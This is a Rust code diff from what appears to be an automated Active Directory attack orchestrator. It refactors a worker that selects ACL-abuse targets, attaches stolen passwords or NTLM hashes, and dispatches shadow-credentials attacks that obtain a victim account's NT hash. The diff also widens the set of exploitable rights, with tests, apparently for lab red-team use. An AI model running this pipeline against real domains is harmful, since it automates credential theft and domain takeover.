@@ -10,15 +10,125 @@ use std::time::Duration;
 
 use serde_json::json;
 use tokio::sync::watch;
-use tracing::{debug, info, warn};
+use tracing::{info, warn};
 
 use crate::orchestrator::dispatcher::Dispatcher;
+use crate::orchestrator::state::StateInner;
 
 /// Dedup key prefix for shadow credential attacks.
 const DEDUP_SHADOW_CREDS: &str = "shadow_creds";
 
 /// Monitors for GenericAll/WriteDacl edges and dispatches shadow credential attacks.
 /// Interval: 30s.
+pub(crate) struct ShadowCredWorkItem {
+    pub vuln_id: String,
+    pub dedup_key: String,
+    pub source_user: String,
+    pub target_user: String,
+    pub domain: String,
+    pub dc_ip: Option<String>,
+    pub credential: Option<ares_core::models::Credential>,
+    pub hash: Option<ares_core::models::Hash>,
+}
+
+/// Select shadow-credentials exploitation work items for this tick.
+///
+/// Walks `state.discovered_vulnerabilities` keeping only shadow-cred-candidate
+/// entries whose target is a User or Computer (the only object classes with
+/// `msDS-KeyCredentialLink`), are not already exploited, have unprocessed
+/// dedup keys, and have a usable source-user credential or NTLM hash.
+///
+/// Pure — extracted so the candidate filter, target-type gate, and source-cred
+/// lookup can be unit-tested without a Dispatcher.
+pub(crate) fn select_shadow_credentials_work(state: &StateInner) -> Vec<ShadowCredWorkItem> {
+    state
+        .discovered_vulnerabilities
+        .values()
+        .filter_map(|vuln| {
+            if !is_shadow_cred_candidate(&vuln.vuln_type) {
+                return None;
+            }
+            if let Some(tt) = vuln.details.get("target_type").and_then(|v| v.as_str()) {
+                let tt = tt.to_lowercase();
+                if !matches!(tt.as_str(), "user" | "computer" | "unknown") {
+                    return None;
+                }
+            }
+            if state.exploited_vulnerabilities.contains(&vuln.vuln_id) {
+                return None;
+            }
+            let dedup_key = format!("{DEDUP_SHADOW_CREDS}:{}", vuln.vuln_id);
+            if state.is_processed(DEDUP_SHADOW_CREDS, &dedup_key) {
+                return None;
+            }
+
+            let source_user = extract_source_user(&vuln.details)?;
+            let target_user = extract_target_user(&vuln.details)?;
+
+            let domain = vuln
+                .details
+                .get("domain")
+                .and_then(|v| v.as_str())
+                .unwrap_or("")
+                .to_string();
+
+            let credential = state.find_source_credential(&source_user, &domain);
+            let hash = if credential.is_none() {
+                state.find_source_hash(&source_user, &domain)
+            } else {
+                None
+            };
+            if credential.is_none() && hash.is_none() {
+                return None;
+            }
+
+            let dc_ip = state
+                .domain_controllers
+                .get(&domain.to_lowercase())
+                .cloned();
+
+            Some(ShadowCredWorkItem {
+                vuln_id: vuln.vuln_id.clone(),
+                dedup_key,
+                source_user,
+                target_user,
+                domain,
+                dc_ip,
+                credential,
+                hash,
+            })
+        })
+        .collect()
+}
+
+/// Build the JSON payload for a shadow-credentials dispatch. Pure construction.
+pub(crate) fn build_shadow_credentials_payload(item: &ShadowCredWorkItem) -> serde_json::Value {
+    let mut payload = json!({
+        "technique": "shadow_credentials",
+        "vuln_type": "shadow_credentials",
+        "vuln_id": item.vuln_id,
+        "target_account": item.target_user,
+        "domain": item.domain,
+    });
+    if let Some(ref dc) = item.dc_ip {
+        payload["target_ip"] = json!(dc);
+        payload["dc_ip"] = json!(dc);
+    }
+    if let Some(ref cred) = item.credential {
+        payload["username"] = json!(cred.username);
+        payload["password"] = json!(cred.password);
+        payload["credential"] = json!({
+            "username": cred.username,
+            "password": cred.password,
+            "domain": cred.domain,
+        });
+    } else if let Some(ref hash) = item.hash {
+        payload["username"] = json!(hash.username);
+        payload["hash"] = json!(hash.hash_value);
+    }
+    payload
+}
+
 pub async fn auto_shadow_credentials(
     dispatcher: Arc<Dispatcher>,
     mut shutdown: watch::Receiver<bool>,
@@ -50,104 +160,13 @@ pub async fn auto_shadow_credentials(
             }
         }
 
-        let work: Vec<ShadowCredWork> = {
+        let work: Vec<ShadowCredWorkItem> = {
             let state = dispatcher.state.read().await;
-
-            state
-                .discovered_vulnerabilities
-                .values()
-                .filter_map(|vuln| {
-                    // Look for ACL-based vulns that grant write access to another principal
-                    if !is_shadow_cred_candidate(&vuln.vuln_type) {
-                        return None;
-                    }
-
-                    if state.exploited_vulnerabilities.contains(&vuln.vuln_id) {
-                        return None;
-                    }
-
-                    let dedup_key = format!("{DEDUP_SHADOW_CREDS}:{}", vuln.vuln_id);
-                    if state.is_processed(DEDUP_SHADOW_CREDS, &dedup_key) {
-                        return None;
-                    }
-
-                    // Extract source (attacker) and target (victim) from vuln details
-                    let source_user = extract_source_user(&vuln.details)?;
-                    let target_user = extract_target_user(&vuln.details)?;
-
-                    let domain = vuln
-                        .details
-                        .get("domain")
-                        .and_then(|v| v.as_str())
-                        .unwrap_or("")
-                        .to_string();
-
-                    // Find credential for the source user. The source user's
-                    // own domain may differ from the vuln's target `domain`
-                    // (cross-forest ACL edges like charlie@contoso →
-                    // ivy@fabrikam), so we cannot domain-restrict the
-                    // lookup against the target.
-                    let credential = state.find_source_credential(&source_user, &domain);
-                    let hash = if credential.is_none() {
-                        state.find_source_hash(&source_user, &domain)
-                    } else {
-                        None
-                    };
-
-                    if credential.is_none() && hash.is_none() {
-                        debug!(
-                            vuln_id = %vuln.vuln_id,
-                            source = %source_user,
-                            "Shadow credentials skipped: no cred/hash for source user"
-                        );
-                        return None;
-                    }
-
-                    let dc_ip = state
-                        .domain_controllers
-                        .get(&domain.to_lowercase())
-                        .cloned();
-
-                    Some(ShadowCredWork {
-                        vuln_id: vuln.vuln_id.clone(),
-                        dedup_key,
-                        source_user,
-                        target_user,
-                        domain,
-                        dc_ip,
-                        credential,
-                        hash,
-                    })
-                })
-                .collect()
+            select_shadow_credentials_work(&state)
         };
 
         for item in work {
-            let mut payload = json!({
-                "technique": "shadow_credentials",
-                "vuln_type": "shadow_credentials",
-                "vuln_id": item.vuln_id,
-                "target_account": item.target_user,
-                "domain": item.domain,
-            });
-
-            if let Some(ref dc) = item.dc_ip {
-                payload["target_ip"] = json!(dc);
-                payload["dc_ip"] = json!(dc);
-            }
-
-            if let Some(ref cred) = item.credential {
-                payload["username"] = json!(cred.username);
-                payload["password"] = json!(cred.password);
-                payload["credential"] = json!({
-                    "username": cred.username,
-                    "password": cred.password,
-                    "domain": cred.domain,
-                });
-            } else if let Some(ref hash) = item.hash {
-                payload["username"] = json!(hash.username);
-                payload["hash"] = json!(hash.hash_value);
-            }
+            let payload = build_shadow_credentials_payload(&item);
 
             let priority = dispatcher.effective_priority("shadow_credentials");
             match dispatcher
@@ -208,19 +227,25 @@ fn extract_target_user(
         .map(|s| s.to_string())
 }
 
-struct ShadowCredWork {
-    vuln_id: String,
-    dedup_key: String,
-    source_user: String,
-    target_user: String,
-    domain: String,
-    dc_ip: Option<String>,
-    credential: Option<ares_core::models::Credential>,
-    hash: Option<ares_core::models::Hash>,
-}
-
 /// Returns `true` if the given vulnerability type is a candidate for shadow
-/// credentials exploitation (ACL-based write access on another principal).
+/// credentials exploitation (ACL-based write access on a user/computer that
+/// can be abused to add a msDS-KeyCredentialLink and obtain that target's
+/// NT hash via certipy auth).
+///
+/// Includes the obvious primitives (GenericAll, GenericWrite, WriteDacl,
+/// WriteOwner) plus three that the lab's BloodHound exposed but the
+/// original matcher missed:
+/// - `allextendedrights`: subsumes User-Force-Change-Password and most
+///   extended rights — equivalent to GenericAll for shadow-creds purposes.
+/// - `writeproperty`: a property write that explicitly covers
+///   msDS-KeyCredentialLink (BloodHound's targetedwrite analogue).
+/// - `forcechangepassword`: while normally used to reset the password,
+///   the same WriteProperty extended right also lets us write
+///   msDS-KeyCredentialLink, so certipy_shadow works without destroying
+///   the lab's seeded password.
+///
+/// All forms accept both the bare and `acl_`-prefixed shapes emitted by
+/// ldap_acl_enumeration's parser.
 pub(crate) fn is_shadow_cred_candidate(vuln_type: &str) -> bool {
     matches!(
         vuln_type.to_lowercase().as_str(),
@@ -229,9 +254,16 @@ pub(crate) fn is_shadow_cred_candidate(vuln_type: &str) -> bool {
             | "writedacl"
             | "writeowner"
             | "shadow_credentials"
+            | "allextendedrights"
+            | "writeproperty"
+            | "forcechangepassword"
             | "acl_genericall"
             | "acl_genericwrite"
             | "acl_writedacl"
+            | "acl_writeowner"
+            | "acl_allextendedrights"
+            | "acl_writeproperty"
+            | "acl_forcechangepassword"
     )
 }
 
@@ -253,6 +285,23 @@ mod tests {
         assert!(is_shadow_cred_candidate("acl_genericall"));
         assert!(is_shadow_cred_candidate("acl_genericwrite"));
         assert!(is_shadow_cred_candidate("acl_writedacl"));
+    }
+
+    #[test]
+    fn is_shadow_cred_candidate_accepts_allextendedrights_and_writeproperty() {
+        // BloodHound surfaces these on user-targeted ACLs (e.g. a low-priv
+        // account with AllExtendedRights on Administrator). Previously
+        // rejected; now accepted so certipy_shadow fires on the direct DA
+        // path.
+        assert!(is_shadow_cred_candidate("allextendedrights"));
+        assert!(is_shadow_cred_candidate("AllExtendedRights"));
+        assert!(is_shadow_cred_candidate("writeproperty"));
+        assert!(is_shadow_cred_candidate("forcechangepassword"));
+        // ACL-prefixed forms emitted by ldap_acl_enumeration parser.
+        assert!(is_shadow_cred_candidate("acl_allextendedrights"));
+        assert!(is_shadow_cred_candidate("acl_writeproperty"));
+        assert!(is_shadow_cred_candidate("acl_forcechangepassword"));
+        assert!(is_shadow_cred_candidate("acl_writeowner"));
     }
 
     #[test]
@@ -470,7 +519,7 @@ mod tests {
 
     #[test]
     fn shadow_cred_work_with_credential() {
-        let work = ShadowCredWork {
+        let work = ShadowCredWorkItem {
             vuln_id: "vuln-sc-001".to_string(),
             dedup_key: format!("{DEDUP_SHADOW_CREDS}:vuln-sc-001"),
             source_user: "testuser".to_string(),
@@ -500,7 +549,7 @@ mod tests {
 
     #[test]
     fn shadow_cred_work_with_hash_fallback() {
-        let work = ShadowCredWork {
+        let work = ShadowCredWorkItem {
             vuln_id: "vuln-sc-002".to_string(),
             dedup_key: format!("{DEDUP_SHADOW_CREDS}:vuln-sc-002"),
             source_user: "svc_admin".to_string(),
@@ -537,7 +586,7 @@ mod tests {
 
     #[test]
     fn shadow_cred_work_no_dc_ip() {
-        let work = ShadowCredWork {
+        let work = ShadowCredWorkItem {
             vuln_id: "vuln-sc-003".to_string(),
             dedup_key: format!("{DEDUP_SHADOW_CREDS}:vuln-sc-003"),
             source_user: "testuser".to_string(),
